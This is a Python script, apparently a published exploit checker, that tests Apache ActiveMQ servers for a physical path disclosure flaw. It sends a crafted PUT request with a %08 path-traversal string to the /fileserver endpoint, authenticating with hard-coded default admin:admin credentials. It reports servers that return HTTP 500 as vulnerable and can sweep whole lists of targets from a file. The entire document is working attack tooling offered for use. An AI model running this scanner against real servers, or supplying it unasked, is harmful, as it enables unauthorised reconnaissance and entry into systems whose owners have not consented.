import requests
import argparse
import urllib3
import sys

urllib3.disable_warnings()


def title():
    print("""
                               ActiveMQ物理路径泄漏漏洞
                      use: python3  ActiveMQ物理路径泄漏漏洞.py
                                 Author: kento-sec
    """)


class information(object):
    def __init__(self, args):
        self.args = args
        self.url = args.url
        self.file = args.file

    def target_url(self):
        url = self.url + "/fileserver/a../../%08/..%08/.%08/%08"
        payload = {}
        headers = {
            "Authorization": "Basic YWRtaW46YWRtaW4=",
            "User-Agent": "Mozilla/5.0 (Windows NT 10.0; WOW64; rv:52.0) Gecko/20100101 Firefox/52.0",
            "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
            "Accept-Language": "zh-CN,zh;q=0.8,en-US;q=0.5,en;q=0.3",
            "Accept-Encoding": "gzip, deflate",
            "DNT": "1",
            "Connection": "close",
            "Upgrade-Insecure-Requests": "1",
            "Content-Type": "application/x-www-form-urlencoded"
        }
        # proxies = {'http': 'http://localhost:8080', 'https': 'http://localhost:8080'}
        try:
            requests.packages.urllib3.disable_warnings()
            web = requests.request("PUT", url, headers=headers,  data=payload, allow_redirects=False)
            if web.status_code == 500:
                print(self.url + "存在ActiveMQ物理路径泄漏漏洞！")
                with open("ActiveMQ物理路径泄漏漏洞结果.txt", mode="a") as rp:
                    rp.write(self.url + "\n")
            if web.status_code == 404:
                print("页面404")
                pass
            # if web.status_code == 302:
            #     print("页面跳转")
            # if web.status_code == 403:
            #     print("waf拦截")
        except requests.exceptions.ConnectionError:
            print("不存在ActiveMQ物理路径泄漏漏洞")

    def file_url(self):
        with open(self.file, "r") as urls:
            for url in urls:
                url = url.strip()  # 去除两边空格
                if url[:4] != "http":
                    url = "http://" + url
                self.url = url.strip()
                information.target_url(self)


if __name__ == "__main__":
    title()
    parser = argparse.ArgumentParser(description="ActiveMQ物理路径泄漏漏洞")
    parser.add_argument("-u", "--url", type=str, metavar="url", help="Target url eg:\"http://127.0.0.1\"")
    parser.add_argument("-f", "--file", metavar="file", help="Targets in file  eg:\"target.txt\"")
    args = parser.parse_args()
    if len(sys.argv) != 3:
        print(
            "[-]  参数错误！\neg1:>>>python3 ActiveMQ物理路径泄漏漏洞.py -u http://127.0.0.1\neg2:>>>python3 ActiveMQ物理路径泄漏漏洞.py -f ip.txt")
    elif args.url:
        information(args).target_url()
    elif args.file:
        information(args).file_url()
